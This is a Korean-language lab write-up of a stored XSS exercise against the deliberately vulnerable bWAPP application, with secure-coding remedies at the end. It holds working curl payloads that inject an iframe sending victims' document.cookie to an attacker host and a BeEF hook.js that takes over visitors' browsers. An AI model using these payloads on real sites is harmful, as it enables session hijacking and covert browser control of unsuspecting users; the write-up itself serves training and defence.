# 웹 해킹 실습 교육: Cross-Site Scripting (XSS) - Stored (Blog)

> **교육 목적 전용 (For Educational Purposes 구실)**
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/xss_stored_1.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### XSS (Stored) 취약점이란?

Cross-Site Scripting (XSS) 취약점 중 **Stored (저장 방식)** 유형은 공격자가 악의적인 스크립트 코드(주로 JavaScript)를 게시판, 블로그, 코멘트란 등을 통해 데이터베이스(DB)나 파일 시스템에 **영구적으로 저장**시킬 때 발생합니다.

이후 해당 데이터를 열람하는 일반 사용자나 웹 관리자의 브라우저에서는 이 저장된 스크립트가 데이터가 아닌 코드로 해석되어 **자동으로 실행(*Reflected*)**됩니다. 이는 악의성 링크를 클릭하지 않아도 단순히 페이지를 방문하는 것만으로 감염되므로 파급력이 매우 큰 취약점입니다. 공격자는 이를 통해 사용자 세션(Cookie) 탈취, 악성코드 유포, 피싱, 브라우저 강제 제어 등의 행위를 수행할 수 있습니다.

### OWASP Top 10 분류
- **A03:2021** – Injection (이전 모델에서는 독자적인 XSS로 분류)

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약 페이지 (xss_stored_1.php) 블로그 입력폼 분석
        (HTML 구문/스크립트 필터링 검증)
        │
        ▼
[2단계] 악성 스크립트 페이로드 작성 및 DB 전송 (Stored)
        (<script>alert('XSS');</script> 등 주입 시도)
        │
        ▼
[3단계] 게시물 로드 및 스크립트 실행 확인
        (입력한 자바스크립트가 브라우저에서 동작하는지 확인)
        │
        ▼
[4단계] 고도화 공격 (세션 탈취 및 BeEF 브라우저 후킹 활성화)
        (타 사용자 브라우저 접속 시 쿠키 탈취 및 BeEF 제어망(Zombie) 연동)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 취약점 여부 기초 테스트 (알럿 창 띄우기)

블로그 'Entry' 폼을 통해 기본적인 자바스크립트 실행을 검증합니다. 공격 스크립트가 무력화(HTML Encode)되지 않고 그대로 저장되는지 파악하는 목적입니다.

```bash
# 기본 alert 창을 발생시키는 XSS Payload 주입
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -d "entry=<script>alert('XSS Stored Test');</script>&entry_add=on&blog=submit" \
     "http://192.168.0.20/bWAPP/xss_stored_1.php" > /dev/null
```

> **결과 확인:** 위 명령어 실행 후 실제 브라우저로 `xss_stored_1.php`에 접속하면, 화면에 "XSS Stored Test" 라는 경고창(Alert)이 출력됩니다. 이는 서버가 입력된 꺾쇠 기호(`<`, `>`)를 필터링 없이 그대로 HTML 컨텍스트에 삽입했음을 의미합니다.

---

### Step 2: 실전 고도화 해킹 (관리자 및 타 사용자의 Session 탈취)

기본 실행이 확인되었으니, 페이지를 열람하는 대상(희생자)의 **인증 쿠키(Session ID)**를 외부의 해커 서버(`192.168.0.146`)로 몰래 전송하는 악성 스크립트를 삽입합니다.

```bash
# 세션 탈취(Cookie Stealing)를 위한 iFrame 삽입 Payload 주입
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -d "entry=<script>document.write('<iframe src=\"http://192.168.0.146/cookie_stealer.php?cookie='+document.cookie+'\"></iframe>');</script>&entry_add=on&blog=submit" \
     "http://192.168.0.20/bWAPP/xss_stored_1.php" > /dev/null
```

> 🚨 **해킹 작동 원리**:
> 이제부터 이 블로그 페이지에 접근하는 모든 타 사용자(최고 관리자 포함)는 자신의 브라우저 백그라운드 환경에서 해커의 `cookie_stealer.php`로 자신의 민감한 세션값(ex. `PHPSESSID=xxx`)을 자동 전송하게 됩니다. 해커는 수집된 타인의 쿠키로 로그인 절차 없이 동일한 권한으로 위장 접속할 수 있습니다(Session Hijacking).

---

### Step 3: 실전 고도화 해킹 (BeEF 프레임워크를 이용한 대상 브라우저 후킹)

단순 세션 탈취를 넘어선 시스템 파악 및 제어를 위해 **[BeEF (Browser Exploitation Framework)](https://beefproject.com/)**를 연동할 수 있습니다. 희생자가 접속하는 즉시 브라우저를 좀비화(Zombie)하여 공격자의 통제 하에 둡니다.

```bash
# BeEF Hook 스크립트 삽입 Payload (공격자의 BeEF 포트를 3000번으로 가정)
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -d "entry=<script src=\"http://192.168.0.146:3000/hook.js\"></script>&entry_add=on&blog=submit" \
     "http://192.168.0.20/bWAPP/xss_stored_1.php" > /dev/null
```

> **결과 확인:**
> 1. 공격자의 Kali 환경에서 `beef-xss` 서비스를 실행하고 관리자 패널(`http://192.168.0.146:3000/ui/panel`)에 접속해 둡니다.
> 2. 대상 사용자가 해당 블로그 화면(`xss_stored_1.php`)을 읽는 순간, 브라우저 백그라운드에서 `hook.js` 파일이 실행됩니다.
> 3. 좀비 브라우저가 된 대상의 정보(Browser 정보, OS 정보, IP/위치 등)가 BeEF 패널의 "Online Browsers" 탭에 실시간으로 등록됩니다. 이를 거점으로 웹캠 스냅샷 촬영, 사용자 화면 캡처, 가짜 로그인 팝업, 내부 로컬망 스캔 등 무수히 많은 시스템 통제 명령을 뻗어나갈 수 있습니다.

---

## 📊 탈취(추출) 정보 요약

- **스크립트 영구 저장(DB)**:
  해당 실습 백엔드 DB 구조를 살펴보면, 입력된 페이로드 코드가 `blog` 테이블의 `entry` 컬럼에 그대로 보관된 것을 확인할 수 있습니다.
  ```html
  <!-- HTML 페이지 소스(소스보기)에 노출된 악성 코드 리플렉션 -->
  <td><script> document.write("<iframe src='http://192.168.0.146/cookie_stealer.php?cookie=" + document.cookie + "'></iframe>")</script></td>
  <td><script src="http://192.168.0.146:3000/hook.js"></script></td>
  ```
- **파급 효과(시스템 정보/사용자 영향)**: 일반 사용자 인증 세션(Session) 탈취, 브라우저 화면 강제 조작(Deface), **BeEF 등을 통한 타겟 로컬 시스템 내부망 정보 스캔 메타데이터 추출, 장치 하드웨어 제어 등 무한한 2차 공격**으로 확장 가능.

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 발생 메커니즘
해당 애플리케이션의 "Low" 보안 등급 설정 시, 사용자 입력 폼(`entry` 파라미터) 데이터를 SQL 인젝션 공격 방어를 위한 단순 처리(`addslashes` 등)만 수행하고, **스크립트 해석의 원인이 되는 HTML 특수문자들에 대해서는 무방비로 데이터베이스에 저장**합니다.
저장된 값을 HTML 테이블을 구성하며 출력할 때도 별도의 처리 없이 `echo` 문을 통해 브라우저로 직접 렌더링되도록 하였기 때문입니다.

### 방어(Secure Coding) 가이드

1. **HTML 엔티티 인코딩 (Output Encoding) ⭐️**
   XSS 공격 대응력의 핵심은 데이터 검증(Validation)과 데이터 치환(Encoding)입니다. 가장 확실한 방법은 DB에서 값을 꺼내어 브라우저로 렌더링하기 전(Output)에, PHP 내장 함수인 **`htmlspecialchars()`** 또는 **`htmlentities()`** 를 적용하는 것입니다.
   ```php
   // 스크립트 실행이 불가능한 일반 문자열로 변환 (High/Medium 보안 레벨 대응 기법)
   echo htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
   ```
   > 이를 적용하면 공격자가 넣은 `<script>` 라는 값이 `&lt;script&gt;`라는 평문 문자로 치환되어, 브라우저가 이를 코드가 아닌 단순한 "글자"로 인식하게 됩니다.

2. **HttpOnly 쿠키 설정 (마지막 보루)**
   만약 XSS 취약점을 개발자가 미처 완벽히 막지 못했더라도, 세션 탈취 등 그 피해를 최소화하는 장치입니다. 서버에서 민감한 쿠키가 발급될 때 헤더 옵션에 **`HttpOnly`** 플래그를 참(ON)으로 설정하여 내보냅니다. 이를 설정하면 자바스크립트의 `document.cookie` 명령어로 해당 세션 쿠키를 읽어들일 수 없게 차단됩니다.

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
